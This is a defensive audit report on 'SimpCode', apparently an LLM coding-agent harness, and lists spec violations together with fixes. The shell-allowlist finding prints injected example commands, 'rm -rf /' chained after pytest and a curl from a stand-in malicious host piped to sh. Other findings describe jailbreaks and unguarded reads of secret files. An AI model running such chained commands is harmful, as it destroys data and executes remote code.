# SimpCode v3.0 Codebase Audit Report
**Auditor:** Principal Software Auditor and Agentic Systems Debugging Engineer
**Date:** May 11, 2026

## Executive Summary
An exhaustive audit of the `SimpCode` codebase against the `SIMPCODE_SDD_v3.md` specification reveals severe systemic drift, broken architectural boundaries, and critical vulnerabilities. Despite laying out a robust "harness engineering" philosophy in the spec, the implementation repeatedly falls back on flimsy prompt engineering and bypasses core safety constructs. Most prominently, the system hallucinates Wiki freshness, trusts the LLM implicitly with shell commands, fails to enforce structural safety guarantees, and misses entire implementation workflows (like knowledge evolution and contextual refinement loops).

The codebase requires an immediate overhaul of its harness layer before any production use. Below are the definitive findings, categorized by impact and root cause.

---

## 1. The "Fake Freshness" Flaw (Wiki Integrity Broken)
**Severity:** Critical
**Affected Modules:** `src/simpcode/harness/tools.py` (`_update_wiki_integrity`), `src/simpcode/core/executor.py` 
**Root Cause:** When `write_file` modifies source code, `_update_wiki_integrity` calculates the new source file hash and overwrites the Wiki page's `source.hash` frontmatter to match. It completely bypasses the LLM and does **not** update or regenerate the semantic text of the Wiki page itself. 
**Spec Violation (Sect 9.5):** "When a file is written or patched, the corresponding Wiki entry... is updated before the next step begins... The hash in the Wiki frontmatter is updated to reflect the new file state." The spec intended for the *cognitive content* to be updated by an LLM alongside the hash.
**Production Impact:** This effectively masks "stale" pages permanently. The Wiki's text describes outdated architecture, but the health checks treat it as "fresh", leading to aggressive hallucination downstream as future planning passes rely on obsolete knowledge.
**Corrective Action:** 
- In `executor.py`, expose the `wiki_maintainer`/LLM-update tool to the agent during execution.
- Rewrite `_update_wiki_integrity` to either invoke the LLM to merge updates semantically, or mark the page as completely stale (dropping the hash) so it forces a sync regen on the next cycle, rather than falsifying the hash.

## 2. RCE Vulnerability in execution Harness (Shell Allowlist Bypass)
**Severity:** Critical
**Affected Modules:** `src/simpcode/harness/tools.py` (`run_shell`)
**Root Cause:** The shell allowlist check validates only the first token: `command.split()[0] in allowlist`. It then indiscriminately executes the command via `subprocess.run(shell=True)`.
**Spec Violation (Sect 9.3 & 14.4):** "Commands not on the allowlist require explicit user approval. Commands that could affect anything outside the project root are blocked entirely." 
**Production Impact:** Arbitrary code execution. An LLM hallucination or jailbreak can issue `pytest foo.py; rm -rf /` or `ls && curl http://malicious.com | sh`. The system will approve it because it starts with `pytest` or `ls`.
**Corrective Action:** 
- Remove `shell=True` and mandate an array of safe arguments via `shlex.split()`.
- Implement rigorous validation: explicitly ban pipeline characters (`|`, `;`, `&&`, `$`, `>`) in the input string.
- If complex commands are strictly necessary, implement a secondary AST parsing step or require manual approval for everything containing shell metacharacters.

## 3. Passive Safety: Inline Linting Not System-Enforced
**Severity:** High
**Affected Modules:** `src/simpcode/core/executor.py`, `src/simpcode/harness/tools.py`
**Root Cause:** Instead of structurally blocking execution and executing a verification binary after writing a file, `executor.py` merely appends a string prompt to the LLM: `result = "File updated. You MUST run verification next."`
**Spec Violation (Sect 9.2):** "The execution harness is the set of structural constraints... enforced by the system. After writing each file, the agent runs the configured linter on that file before proceeding." 
**Production Impact:** Relies purely on the compliance of the LLM. The agent is fundamentally free to ignore the prompt and write another file, accumulating errors and breaking the build.
**Corrective Action:** 
- Hardcode the lint/verify invocation inside or immediately following `harness.write_file()` inside the executor's while loop.
- Block the state transition to the next `PlanStep` until `linter.run()` returns a `0` exit code.

## 4. Total Access: Lack of Context/Secret Exclusion
**Severity:** High
**Affected Modules:** `src/simpcode/harness/tools.py` (`read_file`), `src/simpcode/core/analyzer.py`
**Root Cause:** `read_file` lacks constraints against protected filenames entirely. Furthermore, the `ProjectAnalyzer` arbitrarily ignores *all* `.*` files/directories, breaking awareness of specific configurations, without actually reading `.gitignore` or `simp_exclusions`.
**Spec Violation (Sect 14.5):** "Files matching any of the exclusion patterns in config — .env, credential files, secret stores — are never loaded... The harness enforces this before any read operation."
**Production Impact:** Agent can scrape tokens, API keys, or private SSH keys from `.env` files and dump them to external logs/Wiki models.
**Corrective Action:** 
- Implement a global `ExclusionFilter` class loaded with patterns from `global_config` and `.gitignore`.
- Inject `ExclusionFilter` into `ToolHarness`. Enforce `if filter.is_excluded(file_path): raise Violation()` immediately inside `read_file` and `write_file`.

## 5. Stale Pages Loaded Silently
**Severity:** Medium
**Affected Modules:** `src/simpcode/core/modes.py` (`ScanScene`)
**Root Cause:** In `ScanScene`, when a page triggers `is_page_stale()`, the system prints a warning to the console but still injects the stale content into the prompt context via `semantic_items.append(ContextItem(...))`.
**Spec Violation (Sect 4.4 & 7.2):** "When a stale page is encountered, the system either regenerates it immediately before use or excludes it from context and warns the user." 
**Production Impact:** The prompt budget is consumed by inaccurate context. The plan generation is actively misinformed.
**Corrective Action:** 
- Alter `ScanScene`. If `page_is_stale=True`, do not append it to `semantic_items`. Alternatively, invoke a real-time `engine.regenerate_page()` synchronously before continuing list assembly.

## 6. Planning Loop Abstraction Failure
**Severity:** Medium
**Affected Modules:** `src/simpcode/core/planner.py`
**Root Cause:** The `PlanGenerator` does a single pass `structured_output()` call mapped to the `Plan` schema. It cannot fail gracefully, request more context, or break out of its loop.
**Spec Violation (Sect 8.5):** "When Thinking Reveals Insufficient Context... Think Through explicitly identifies what it is missing and requests targeted additional context... It does not proceed with a plan...".
**Production Impact:** The LLM is forced to guess implementations for hidden abstractions because the tooling framework literally provides it no API to request deeper reads during Phase 3. 
**Corrective Action:** 
- Create a `PlanOrRequest` union schema. 
- Build a ReAct loop around the `planner`: if the LLM issues a `ContextRequest`, recursively send those arguments back to `ScanScene` tools to mutate the context stream, and retry generation.

## 7. Incomplete Workflow: Discarded Knowledge Evolution
**Severity:** Medium
**Affected Modules:** `src/simpcode/cli/main.py`, `src/simpcode/core/evolution.py`
**Root Cause:** `evolver.run()` successfully returns extracted architectural patterns and risks via `EvolutionProposals`, but `main.py` explicitly drops the return object and never prompts the user.
**Spec Violation (Sect 10.3):** "When SimpCode observes a pattern... it proposes adding it. These proposals are surfaced to the developer for confirmation, not applied automatically."
**Production Impact:** The "Get Better" phase extracts powerful insights and throws them into the void, causing knowledge stagnation.
**Corrective Action:** 
- In `main.py`, capture the `EvolutionProposals` object.
- Pipe it through `console` interaction asking "Approve new Invariants/Patterns?" and conditionally append them to their respective wiki pages.

## 8. Missing Tools & Broken Scopes
**Severity:** Low (Functional Bug)
**Affected Modules:** `src/simpcode/harness/tools.py` (`_check_scope`, `write_file`)
**Root Cause 1 (Scope checks):** Directory validation checks `parent_dir in self.allowed_paths`. But since `allowed_paths` is strictly populated with specific absolute target filenames from the Plan, a parent directory will never match, causing failures on legitimate net-new files.
**Root Cause 2 (Patch Tool):** Despite Spec 9.3 preferring targeted patching to avoid large codebase wipes, `executor.py` only equips the agent with `write_file` (clobber).
**Corrective Action:** 
- Rewrite `_check_scope` to accurately parse subtree matches using `Path.is_relative_to()`. 
- Implement an explicit `patch_file` tool adopting standard diff logic or line-range overloads.

---
**Summary:** The architectural foundations are present but they simulate rigor rather than strictly executing it. Fixing these constraints maps directly to the delta between an unsafe toy and a production-grade structural harness.